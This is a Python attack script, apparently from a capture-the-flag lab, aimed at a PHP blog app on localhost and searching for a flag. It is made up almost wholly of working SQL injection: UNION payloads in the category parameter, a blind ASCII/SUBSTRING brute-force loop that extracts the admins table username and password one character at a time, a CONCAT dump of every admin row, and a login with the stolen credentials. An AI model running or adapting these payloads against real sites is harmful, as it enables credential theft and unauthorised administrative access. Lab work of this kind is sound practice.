import requests
import urllib.parse
import re

target = "http://127.0.0.1:32780/"
session = requests.Session()
session.cookies.set('PHPSESSID', 'a619c2d322b0d2025997d9751eb6d09a')

print("="*80)
print("FINAL CREDENTIAL EXTRACTION & ADMIN ACCESS")
print("="*80)

# Extract actual data by comparing responses
def extract_raw_value(table, column):
    """Extract raw value from UNION query result"""
    payload = f"Nature' UNION SELECT {column} FROM {table} LIMIT 1#"
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    
    # Save response for comparison
    response_text = r.text
    
    # Create a baseline - query with literal string
    baseline_payload = f"Nature' UNION SELECT 'BASELINE_TEST' FROM {table} LIMIT 1#"
    r_baseline = session.get(target + "?category=" + urllib.parse.quote(baseline_payload))
    baseline_text = r_baseline.text
    
    # Compare responses - find differences
    # Split by lines and compare
    response_lines = response_text.split('\n')
    baseline_lines = baseline_text.split('\n')
    
    # Find lines that differ
    diff_lines = []
    for i, line in enumerate(response_lines):
        if i < len(baseline_lines):
            if line != baseline_lines[i] and 'Notice' not in line:
                diff_lines.append(line)
    
    # Also check for values embedded in the HTML structure
    # Look for text that's not HTML tags and not typical page content
    clean_html = re.sub(r'<[^>]+>', '<>', response_text)
    parts = clean_html.split('<>')
    
    # Filter out empty strings and common content
    potential_values = []
    for part in parts:
        part = part.strip()
        if part and len(part) > 3 and 'Notice' not in part:
            # Exclude common page phrases
            exclude = ['Welcome to Our Blog', 'Choose a category', 'Admin Login', 'All Categories', 'Nature','Tech','Cooking','Photography','Health']
            if not any(excl in part for excl in exclude):
                potential_values.append(part)
    
    return potential_values

# Extract credentials
print("\n[+] Extracting admin credentials from database")

print("\n[+] Attempt 1: Direct username extraction")
username_values = extract_raw_value('admins', 'username')
print(f"Username candidates: {username_values}")

print("\n[+] Attempt 2: Direct password extraction")  
password_values = extract_raw_value('admins', 'password')
print(f"Password candidates: {password_values}")

# Try second row in case first is empty
print("\n[+] Attempt 3: Trying second row (LIMIT 1,1)")

payload_user2 = "Nature' UNION SELECT username FROM admins LIMIT 1,1#"
r_user2 = session.get(target + "?category=" + urllib.parse.quote(payload_user2))

payload_pass2 = "Nature' UNION SELECT password FROM admins LIMIT 1,1#"
r_pass2 = session.get(target + "?category=" + urllib.parse.quote(payload_pass2))

print(f"Second username response: {len(r_user2.text)} bytes")
print(f"Second password response: {len(r_pass2.text)} bytes")

# Alternative approach - use ASCII/CHAR to build strings directly
print("\n[+] Attempt 4: Brute-force character extraction")

def get_char_at(table, column, position):
    """Get character at specific position using ASCII()"""
    for ascii_val in range(32, 127):
        payload = f"Nature' UNION SELECT * FROM admins WHERE ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{position},1))={ascii_val}#"
        r = session.get(target + "?category=" + urllib.parse.quote(payload))
        if "No posts found" in r.text:
            return chr(ascii_val)
    return None

# Try to extract first few characters
username_chars = []
for pos in range(1, 20):
    char = get_char_at('admins', 'username', pos)
    if char:
        username_chars.append(char)
        print(f"Username char {pos}: '{char}'")
    else:
        break

if username_chars:
    username = ''.join(username_chars)
    print(f"\n[!] EXTRACTED USERNAME: {username}")

# Try same for password
password_chars = []
for pos in range(1, 40):
    char = get_char_at('admins', 'password', pos)
    if char:
        password_chars.append(char)
        print(f"Password char {pos}: '{char}'")
    else:
        break

if password_chars:
    password = ''.join(password_chars)
    print(f"\n[!] EXTRACTED PASSWORD: {password}")

# Attempt login with extracted credentials
admin_url = "http://127.0.0.1:32780/admin.php"
print(f"\n[+] Accessing admin panel: {admin_url}")

r = session.get(admin_url)
print(f"Status: {r.status_code}")

if r.status_code == 200:
    # Check if we have any extracted credentials
    if 'username' in locals() and 'password' in locals():
        print(f"\n[!] Attempting login with: {username} / {password}")
        
        # Try login
        login_data = {
            'username': username,
            'password': password
        }
        
        r_login = session.post(admin_url, data=login_data)
        print(f"Login response status: {r_login.status_code}")
        print(f"Login response:\n{r_login.text[:1000]}")
        
        # Check for flag in response
        if 'FLAG{' in r_login.text:
            flag_match = re.search(r'FLAG\{[^}]+\}', r_login.text)
            if flag_match:
                print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")
        
        # Check for admin content
        if "admin" in r_login.text.lower() or "logged" in r_login.text.lower():
            print("[!] Successfully logged into admin panel!")

# Final attempt - dump entire admins table row by row
print("\n[+] Final attempt: Dumping entire admins table content")

for row in range(10):
    payload = f"Nature' UNION SELECT CONCAT(username, ':', password) FROM admins LIMIT {row},1#"
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    
    if "No posts found" in r.text:
        # Extract any data patterns
        text = re.sub(r'<[^>]+>', ' ', r.text)
        text = re.sub(r'\s+', ' ', text).strip()
        
        # Look for anything that looks like credential formats
        patterns = re.findall(r'\b\w+[:|]\w+\b', text)
        if patterns:
            print(f"[!] Row {row} data patterns: {patterns}")
            for pattern in patterns:
                if 'FLAG{' in pattern:
                    print(f"[!] FLAG IN CREDENTIALS: {pattern}")

print("\n"+"="*80)
print("FINAL EXTRACTION COMPLETE")
print("="*80)
